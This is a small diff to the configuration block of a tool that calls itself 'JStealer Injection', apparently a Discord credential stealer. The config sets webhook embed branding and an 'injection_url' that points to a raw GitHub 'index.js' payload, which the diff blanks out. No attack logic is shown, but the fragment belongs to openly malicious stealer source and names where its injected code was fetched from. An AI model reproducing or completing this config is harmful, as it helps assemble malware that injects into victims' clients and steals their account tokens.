@@ -14,7 +14,7 @@ const config = {
   embed_name: 'JStealer Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1253458021686706196/1253458088380469338/c89a783bd9dd46d42363a3332d4b130d.jpg?ex=6675ed50&is=66749bd0&hm=15a90a7d9603ae86a836adc3fdd5ddc4dcab82218fd522e95e49fbb1d8225684&'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Shadow132245/injection33/main/index.js', 
+  injection_url: '', 
   /**
    
    **/
